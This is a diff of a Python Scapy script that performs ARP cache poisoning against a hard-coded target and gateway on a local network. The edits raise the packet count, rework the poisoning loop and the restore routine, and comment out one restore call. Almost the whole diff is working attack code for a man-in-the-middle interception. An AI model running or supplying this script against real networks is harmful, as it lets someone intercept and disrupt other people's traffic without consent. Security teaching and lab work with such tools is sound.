@@ -7,16 +7,18 @@ import signal
 interface = "en0"
 target_ip = "192.168.1.66"
 gateway_ip = "192.168.1.1"
-packet_count = 1000
+packet_count = 10000
 
 
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     # slightly different method using send
+
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
+             hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
+             hwsrc=gateway_mac), count=5)
     print "[*] Restoring target..."
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=gateway_mac), count=5)
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
-             hwsrc=gateway_mac), count=5)
+    return
 
 def get_mac(ip_address):
     responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
@@ -28,7 +30,7 @@ def get_mac(ip_address):
     return None
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    global poisoning
+    poisoning = True
 
     poison_target = ARP()
     poison_target.op = 2
@@ -44,15 +46,17 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     print "[*] Beginning the ARP poison. [CTRL-C to stop]"
 
-    while True:
+    while poisoning:
         try:
             send(poison_target)
             send(poison_gateway)
             time.sleep(2)
         except KeyboardInterrupt:
+            poisoning=False
             restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+            break
     print "[*] ARP poison attack finished."
-        return
+    return
 
 
 
@@ -92,5 +96,5 @@ try:
     restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
 except KeyboardInterrupt:
     # restore the network
-    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
     sys.exit(0)
